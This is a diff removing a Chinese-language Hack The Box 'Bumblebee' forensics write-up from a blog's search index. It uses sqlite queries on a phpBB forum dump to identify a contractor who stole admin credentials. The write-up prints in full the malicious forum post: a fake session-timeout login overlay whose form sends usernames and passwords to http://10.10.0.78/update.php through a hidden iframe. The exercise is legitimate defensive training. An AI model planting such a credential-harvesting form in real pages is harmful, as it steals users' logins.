@@ -1,88 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Bumblebee-HackTheBox</title>
-    <url>/article/Bumblebee-HackTheBox.html</url>
-    <content><![CDATA[<p>对sqlite3数据库文件进行日志分析</p>
-<span id="more"></span>
-
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
-<p>外部承包商通过访客 Wi-Fi 访问了 Forela 的内部论坛，他们似乎窃取了管理用户的凭据！我们附上了论坛的一些日志和 sqlite3 格式的完整数据库转储，以帮助您进行调查。</p>
-</blockquote>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>外部承包商的用户名是什么？</strong></p>
-<p>解压文件得到log日志和sqlite3数据库文件</p>
-<p><img src="/article/Bumblebee-HackTheBox/image-20240419095217173.png"></p>
-<p>使用sqlite打开</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlite incident.sqlite3</span><br></pre></td></tr></table></figure>
-
-<p>然后<code>.tables</code>查看所有表找到<code>phpbb_users</code>，那么我们查看下字段</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma table_info(phpbb_users);</span><br></pre></td></tr></table></figure>
-
-<p>发现有<code>username</code>和<code>user_password</code></p>
-<p><img src="/article/Bumblebee-HackTheBox/image-20240419095103867.png"></p>
-<p>直接查询</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,user_password from phpbb_users;</span><br></pre></td></tr></table></figure>
-
-<p>注意到最下面的<code>apoole1</code></p>
-<p><img src="/article/Bumblebee-HackTheBox/image-20240419095434129.png"></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>承包商使用什么 IP 地址创建帐户？</strong></p>
-<p>刚刚查看表的字段里有<code>user_ip</code>，查询得到ip为<code>10.10.0.78</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select user_ip from phpbb_users where username=&quot;apoole1&quot;;</span><br></pre></td></tr></table></figure>
-
-<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>承包商发布的恶意帖子的 post_id 是什么？</strong></p>
-<p>我们找到<code>phpbb_posts</code>，然后查询一下</p>
-<p><img src="/article/Bumblebee-HackTheBox/image-20240419100317816.png"></p>
-<p>很明显id为9的内容很多</p>
-<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>凭据窃取者将其数据发送到的完整 URI 是什么？</strong></p>
-<p>我们将前一问的表单内容下载下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select post_text from phpbb_posts where post_id=9;</span><br></pre></td></tr></table></figure>
-
-<p>内容如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; z-index: 100;&#125;.modal &#123; position:fixed; top:0; left:0; height:100%;</span><br><span class="line">        width:100%; z-index:101; background-color:white; opacity:1;&#125;.modal.hidden</span><br><span class="line">        &#123; visibility: hidden;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        function sethidden() &#123;</span><br><span class="line">            const d = new Date();</span><br><span class="line">            d.setTime(d.getTime() + (24 * 60 * 60 * 1000));</span><br><span class="line">            let expires = &quot;expires=&quot; + d.toUTCString();</span><br><span class="line">            document.cookie = &quot;phpbb_token=1;&quot; + expires + &quot;;&quot;;</span><br><span class="line">            var modal = document.getElementById(&#x27;zbzbz1234&#x27;);</span><br><span class="line">            modal.classList.add(&quot;hidden&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.addEventListener(&quot;DOMContentLoaded&quot;,</span><br><span class="line">        function(event) &#123;</span><br><span class="line">            let cookieexists = false;</span><br><span class="line">            let name = &quot;phpbb_token=&quot;;</span><br><span class="line">            let cookies = decodeURIComponent(document.cookie);</span><br><span class="line">            let ca = cookies.split(&#x27;;&#x27;);</span><br><span class="line">            for (let i = 0; i &lt; ca.length; i++) &#123;</span><br><span class="line">                let c = ca[i];</span><br><span class="line">                while (c.charAt(0) == &#x27; &#x27;) &#123;</span><br><span class="line">                    c = c.substring(1);</span><br><span class="line">                &#125;</span><br><span class="line">                if (c.indexOf(name) == 0) &#123;</span><br><span class="line">                    cookieexists = true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (cookieexists) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            var modal = document.getElementById(&#x27;zbzbz1234&#x27;);</span><br><span class="line">            modal.classList.remove(&quot;hidden&quot;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;iframe name=&quot;hiddenframe&quot; id=&quot;hiddenframe&quot; style=&quot;display:none&quot;&gt;</span><br><span class="line">    &lt;/iframe&gt;</span><br><span class="line">    &lt;div class=&quot;modal hidden&quot; id=&quot;zbzbz1234&quot; onload=&quot;shouldshow&quot;&gt;</span><br><span class="line">        &lt;div id=&quot;wrap&quot; class=&quot;wrap&quot;&gt;</span><br><span class="line">            &lt;a id=&quot;top&quot; class=&quot;top-anchor&quot; accesskey=&quot;t&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;div id=&quot;page-header&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;headerbar&quot; role=&quot;banner&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;div id=&quot;site-description&quot; class=&quot;site-description&quot;&gt;</span><br><span class="line">                            &lt;a id=&quot;logo&quot; class=&quot;logo&quot; href=&quot;./index.php&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;site_logo&quot;&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                            &lt;h1&gt;</span><br><span class="line">                                forum.forela.co.uk</span><br><span class="line">                            &lt;/h1&gt;</span><br><span class="line">                            &lt;p&gt;</span><br><span class="line">                                Forela internal forum</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                            &lt;p class=&quot;skiplink&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;#start_here&quot;&gt;</span><br><span class="line">                                    Skip to content</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div id=&quot;search-box&quot; class=&quot;search-box search-header&quot; role=&quot;search&quot;&gt;</span><br><span class="line">                            &lt;form action=&quot;./search.php&quot; method=&quot;get&quot; id=&quot;search1&quot;&gt;</span><br><span class="line">                                &lt;fieldset&gt;</span><br><span class="line">                                    &lt;input name=&quot;keywords&quot; id=&quot;keywords1&quot; type=&quot;search&quot; maxlength=&quot;128&quot; title=&quot;Search for keywords&quot;</span><br><span class="line">                                    class=&quot;inputbox search tiny&quot; size=&quot;20&quot; value=&quot;&quot; placeholder=&quot;Search…&quot;&gt;</span><br><span class="line">                                    &lt;button class=&quot;button button-search&quot; type=&quot;submit&quot; title=&quot;Search&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                            Search</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/button&gt;</span><br><span class="line">                                    &lt;a href=&quot;./search.php&quot; class=&quot;button button-search-end&quot; title=&quot;Advanced search&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-cog fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                            Advanced search</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/fieldset&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;navbar&quot; role=&quot;navigation&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-main&quot; class=&quot;nav-main linklist&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li id=&quot;quick-links&quot; class=&quot;quick-links dropdown-container responsive-menu&quot;</span><br><span class="line">                            data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;#&quot; class=&quot;dropdown-trigger dropdown-toggle&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-bars fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        Quick links</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;div class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;pointer&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;pointer-inner&quot;&gt;</span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;ul class=&quot;dropdown-contents&quot; role=&quot;menu&quot;&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php?search_id=unanswered&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-file-o fa-fw icon-gray&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Unanswered topics</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php?search_id=active_topics&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-file-o fa-fw icon-blue&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Active topics</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li&gt;</span><br><span class="line">                                            &lt;a href=&quot;./search.php&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                                &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                                &lt;/i&gt;</span><br><span class="line">                                                &lt;span&gt;</span><br><span class="line">                                                    Search</span><br><span class="line">                                                &lt;/span&gt;</span><br><span class="line">                                            &lt;/a&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                        &lt;li class=&quot;separator&quot;&gt;</span><br><span class="line">                                        &lt;/li&gt;</span><br><span class="line">                                    &lt;/ul&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;/phpBB3/app.php/help/faq&quot; rel=&quot;help&quot; title=&quot;Frequently Asked Questions&quot;</span><br><span class="line">                                role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-question-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        FAQ</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;li class=&quot;rightside&quot; data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./ucp.php?mode=login&quot; title=&quot;Login&quot; accesskey=&quot;x&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-power-off fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Login</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/li&gt;</span><br><span class="line">                                &lt;li class=&quot;rightside&quot; data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./ucp.php?mode=register&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-pencil-square-o  fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Register</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/li&gt;</span><br><span class="line">                            &lt;/li data-skip-responsive=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-breadcrumbs&quot; class=&quot;nav-breadcrumbs linklist navlinks&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li class=&quot;breadcrumbs&quot; itemscope=&quot;&quot; itemtype=&quot;http://schema.org/BreadcrumbList&quot;</span><br><span class="line">                            style=&quot;max-width: 936px;&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;crumb&quot; itemtype=&quot;http://schema.org/ListItem&quot; itemprop=&quot;itemListElement&quot;</span><br><span class="line">                                itemscope=&quot;&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./index.php&quot; itemtype=&quot;https://schema.org/Thing&quot; itemprop=&quot;item&quot;</span><br><span class="line">                                    accesskey=&quot;h&quot; data-navbar-reference=&quot;index&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-home fa-fw&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span itemprop=&quot;name&quot;&gt;</span><br><span class="line">                                            Board index</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                    &lt;meta itemprop=&quot;position&quot; content=&quot;1&quot;&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside responsive-search&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;./search.php&quot; title=&quot;View the advanced search options&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-search fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span class=&quot;sr-only&quot;&gt;</span><br><span class="line">                                        Search</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;a id=&quot;start_here&quot; class=&quot;anchor&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;div id=&quot;page-body&quot; class=&quot;page-body&quot; role=&quot;main&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;panel&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                            &lt;h3&gt;</span><br><span class="line">                                Session Timeout</span><br><span class="line">                            &lt;/h3&gt;</span><br><span class="line">                            &lt;br/&gt;</span><br><span class="line">                            &lt;br/&gt;</span><br><span class="line">                            &lt;p&gt;</span><br><span class="line">                                Your session token has timed out in order to proceed you must login again.</span><br><span class="line">                            &lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;form action=&quot;http://10.10.0.78/update.php&quot; method=&quot;post&quot; id=&quot;login&quot; data-focus=&quot;username&quot;</span><br><span class="line">                target=&quot;hiddenframe&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;panel&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                            &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                                &lt;h2 class=&quot;login-title&quot;&gt;</span><br><span class="line">                                    Login</span><br><span class="line">                                &lt;/h2&gt;</span><br><span class="line">                                &lt;fieldset class=&quot;fields1&quot;&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &lt;label for=&quot;username&quot;&gt;</span><br><span class="line">                                                Username:</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;text&quot; tabindex=&quot;1&quot; name=&quot;username&quot; id=&quot;username&quot; size=&quot;25&quot;</span><br><span class="line">                                            value=&quot;&quot; class=&quot;inputbox autowidth&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &lt;label for=&quot;password&quot;&gt;</span><br><span class="line">                                                Password:</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;password&quot; tabindex=&quot;2&quot; id=&quot;password&quot; name=&quot;password&quot; size=&quot;25&quot;</span><br><span class="line">                                            class=&quot;inputbox autowidth&quot; autocomplete=&quot;off&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;label for=&quot;autologin&quot;&gt;</span><br><span class="line">                                                &lt;input type=&quot;checkbox&quot; name=&quot;autologin&quot; id=&quot;autologin&quot; tabindex=&quot;4&quot;&gt;</span><br><span class="line">                                                Remember me</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;label for=&quot;viewonline&quot;&gt;</span><br><span class="line">                                                &lt;input type=&quot;checkbox&quot; name=&quot;viewonline&quot; id=&quot;viewonline&quot; tabindex=&quot;5&quot;&gt;</span><br><span class="line">                                                Hide my online status this session</span><br><span class="line">                                            &lt;/label&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                    &lt;dl&gt;</span><br><span class="line">                                        &lt;dt&gt;</span><br><span class="line">                                            &amp;nbsp;</span><br><span class="line">                                        &lt;/dt&gt;</span><br><span class="line">                                        &lt;dd&gt;</span><br><span class="line">                                            &lt;input type=&quot;submit&quot; name=&quot;login&quot; tabindex=&quot;6&quot; value=&quot;Login&quot; class=&quot;button1&quot;</span><br><span class="line">                                            onclick=&quot;sethidden()&quot;&gt;</span><br><span class="line">                                        &lt;/dd&gt;</span><br><span class="line">                                    &lt;/dl&gt;</span><br><span class="line">                                &lt;/fieldset class=&quot;fields1&quot;&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/form&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=&quot;page-footer&quot; class=&quot;page-footer&quot; role=&quot;contentinfo&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;navbar&quot; role=&quot;navigation&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">                        &lt;ul id=&quot;nav-footer&quot; class=&quot;nav-footer linklist&quot; role=&quot;menubar&quot;&gt;</span><br><span class="line">                            &lt;li class=&quot;breadcrumbs&quot;&gt;</span><br><span class="line">                                &lt;span class=&quot;crumb&quot;&gt;</span><br><span class="line">                                    &lt;a href=&quot;./index.php&quot; data-navbar-reference=&quot;index&quot; title=&quot;Board index&quot;&gt;</span><br><span class="line">                                        &lt;i class=&quot;icon fa-home fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                        &lt;/i&gt;</span><br><span class="line">                                        &lt;span&gt;</span><br><span class="line">                                            Board index</span><br><span class="line">                                        &lt;/span&gt;</span><br><span class="line">                                    &lt;/a&gt;</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;responsive-menu hidden rightside dropdown-container&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;javascript:void(0);&quot; class=&quot;js-responsive-menu-link responsive-menu-link dropdown-toggle&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-bars fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                                &lt;div class=&quot;dropdown&quot;&gt;</span><br><span class="line">                                    &lt;div class=&quot;pointer&quot;&gt;</span><br><span class="line">                                        &lt;div class=&quot;pointer-inner&quot;&gt;</span><br><span class="line">                                        &lt;/div&gt;</span><br><span class="line">                                    &lt;/div&gt;</span><br><span class="line">                                    &lt;ul class=&quot;dropdown-contents&quot;&gt;</span><br><span class="line">                                    &lt;/ul&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside&quot;&gt;</span><br><span class="line">                                All times are</span><br><span class="line">                                &lt;span title=&quot;UTC&quot;&gt;</span><br><span class="line">                                    UTC</span><br><span class="line">                                &lt;/span&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                            &lt;li class=&quot;rightside&quot;&gt;</span><br><span class="line">                                &lt;a href=&quot;./ucp.php?mode=delete_cookies&quot; data-ajax=&quot;true&quot; data-refresh=&quot;true&quot;</span><br><span class="line">                                role=&quot;menuitem&quot;&gt;</span><br><span class="line">                                    &lt;i class=&quot;icon fa-trash fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                                    &lt;/i&gt;</span><br><span class="line">                                    &lt;span&gt;</span><br><span class="line">                                        Delete cookies</span><br><span class="line">                                    &lt;/span&gt;</span><br><span class="line">                                &lt;/a&gt;</span><br><span class="line">                            &lt;/li&gt;</span><br><span class="line">                        &lt;/ul&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div class=&quot;copyright&quot;&gt;</span><br><span class="line">                    &lt;p class=&quot;footer-row&quot;&gt;</span><br><span class="line">                        &lt;span class=&quot;footer-copyright&quot;&gt;</span><br><span class="line">                            Powered by</span><br><span class="line">                            &lt;a href=&quot;https://www.phpbb.com/&quot;&gt;</span><br><span class="line">                                phpBB</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                            ® Forum Software © phpBB Limited</span><br><span class="line">                        &lt;/span&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                    &lt;p class=&quot;footer-row&quot;&gt;</span><br><span class="line">                        &lt;a class=&quot;footer-link&quot; href=&quot;./ucp.php?mode=privacy&quot; title=&quot;Privacy&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;footer-link-text&quot;&gt;</span><br><span class="line">                                Privacy</span><br><span class="line">                            &lt;/span&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                        |</span><br><span class="line">                        &lt;a class=&quot;footer-link&quot; href=&quot;./ucp.php?mode=terms&quot; title=&quot;Terms&quot; role=&quot;menuitem&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;footer-link-text&quot;&gt;</span><br><span class="line">                                Terms</span><br><span class="line">                            &lt;/span&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;darkenwrapper&quot; class=&quot;darkenwrapper&quot; data-ajax-error-title=&quot;AJAX error&quot;</span><br><span class="line">                data-ajax-error-text=&quot;Something went wrong when processing your request.&quot;</span><br><span class="line">                data-ajax-error-text-abort=&quot;User aborted request.&quot; data-ajax-error-text-timeout=&quot;Your request timed out; please try again.&quot;</span><br><span class="line">                data-ajax-error-text-parsererror=&quot;Something went wrong with the request and the server returned an invalid reply.&quot;&gt;</span><br><span class="line">                    &lt;div id=&quot;darken&quot; class=&quot;darken&quot;&gt;</span><br><span class="line">                        &amp;nbsp;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;phpbb_alert&quot; class=&quot;phpbb_alert&quot; data-l-err=&quot;Error&quot; data-l-timeout-processing-req=&quot;Request timed out.&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;#&quot; class=&quot;alert_close&quot;&gt;</span><br><span class="line">                        &lt;i class=&quot;icon fa-times-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/i&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                    &lt;h3 class=&quot;alert_title&quot;&gt;</span><br><span class="line">                        &amp;nbsp;</span><br><span class="line">                    &lt;/h3&gt;</span><br><span class="line">                    &lt;p class=&quot;alert_text&quot;&gt;</span><br><span class="line">                    &lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">                &lt;div id=&quot;phpbb_confirm&quot; class=&quot;phpbb_alert&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;#&quot; class=&quot;alert_close&quot;&gt;</span><br><span class="line">                        &lt;i class=&quot;icon fa-times-circle fa-fw&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;/i&gt;</span><br><span class="line">                    &lt;/a&gt;</span><br><span class="line">                    &lt;div class=&quot;alert_text&quot;&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;a id=&quot;bottom&quot; class=&quot;anchor&quot; accesskey=&quot;z&quot;&gt;</span><br><span class="line">            &lt;/a&gt;</span><br><span class="line">            &lt;img src=&quot;./cron.php?cron_type=cron.task.core.tidy_warnings&quot; width=&quot;1&quot;</span><br><span class="line">            height=&quot;1&quot; alt=&quot;cron&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;span&gt;</span><br><span class="line">        Greetings everyone,</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        I am just a visiting IT Contractor, it&#x27;s a fantastic company y&#x27;all have</span><br><span class="line">        here.</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        I hope to work with you all again soon.</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        Regards,</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        Alex Poole</span><br><span class="line">    &lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
-
-<p>成功找到<code>&lt;form action=&quot;http://10.10.0.78/update.php&quot; method=&quot;post&quot; id=&quot;login&quot; data-focus=&quot;username&quot;</code>，说明攻击者想上传到自己的ip上，url为<code>http://10.10.0.78/update.php</code></p>
-<h1 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h1><p><strong>承包商什么时候以管理员身份登录论坛的？</strong></p>
-<p>还是查表找到<code>phpbb_log</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from phpbb_log;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Bumblebee-HackTheBox/image-20240419102440293.png"></p>
-<p>可以将时间戳<code>1682506392</code>转换为标准时间，脚本如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import datetime</span><br><span class="line">import pytz</span><br><span class="line"></span><br><span class="line">timestamp = 1682506392</span><br><span class="line">utc_timezone = pytz.timezone(&#x27;UTC&#x27;)</span><br><span class="line">dt = datetime.datetime.fromtimestamp(timestamp, utc_timezone)</span><br><span class="line">standard_time = dt.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class="line"></span><br><span class="line">print(standard_time)</span><br></pre></td></tr></table></figure>
-
